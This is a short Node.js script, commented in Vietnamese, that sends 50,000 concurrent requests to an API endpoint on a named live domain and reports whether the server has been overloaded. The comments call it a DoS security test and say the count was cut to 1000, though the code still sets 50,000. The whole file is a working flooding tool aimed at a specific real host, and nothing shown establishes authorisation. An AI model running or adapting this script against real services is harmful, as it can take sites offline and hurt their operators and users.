// attack.js - Chạy bằng Node.js, KHÔNG phải browser
// ⚠️ CẢNH BÁO: Script này chỉ để test bảo mật, ĐỪNG dùng trên production!

// Node.js 18+ có built-in fetch, không cần import
async function attack() {
  console.log('🚀 Bắt đầu attack với 1000 concurrent requests...');
  console.log('⚠️ Đây là test DoS - Server có thể sập!\n');
  
  const startTime = Date.now();
  const promises = [];
  
  // Giảm xuống 1000 để test, tránh crash máy local
  // Nếu muốn test thật: đổi thành 10000
  const totalRequests = 50000;
  
  for (let i = 0; i < totalRequests; i++) {
    promises.push(
      fetch('https://xomnghien.com/api/matches?limit=20&offset=0')
        .then(r => {
          if (i % 100 === 0) console.log(`✅ Request ${i}: ${r.status}`);
          return r.status;
        })
        .catch(e => {
          if (i % 100 === 0) console.log(`❌ Request ${i}: Failed - ${e.message}`);
          return 'failed';
        })
    );
  }
  
  console.log(`\n⏳ Đang gửi ${totalRequests} requests...\n`);
  
  const results = await Promise.all(promises);
  const endTime = Date.now();
  
  // Thống kê
  const success = results.filter(r => r === 200).length;
  const failed = results.filter(r => r === 'failed').length;
  const duration = ((endTime - startTime) / 1000).toFixed(2);
  
  console.log('\n📊 KẾT QUẢ:');
  console.log(`   Total requests: ${totalRequests}`);
  console.log(`   ✅ Success: ${success}`);
  console.log(`   ❌ Failed: ${failed}`);
  console.log(`   ⏱️  Duration: ${duration}s`);
  console.log(`   🚀 Requests/sec: ${(totalRequests / duration).toFixed(2)}`);
  
  if (failed > totalRequests * 0.5) {
    console.log('\n🔴 SERVER ĐÃ BỊ QUẢN TẢI! (>50% requests failed)');
  } else if (failed > totalRequests * 0.2) {
    console.log('\n⚠️  SERVER BỊ LAG NGHIÊM TRỌNG! (>20% requests failed)');
  } else {
    console.log('\n✅ Server vẫn ổn định (tuy nhiên cần thêm rate limiting!)');
  }
}

attack().catch(err => {
  console.error('💥 Attack script crashed:', err.message);
});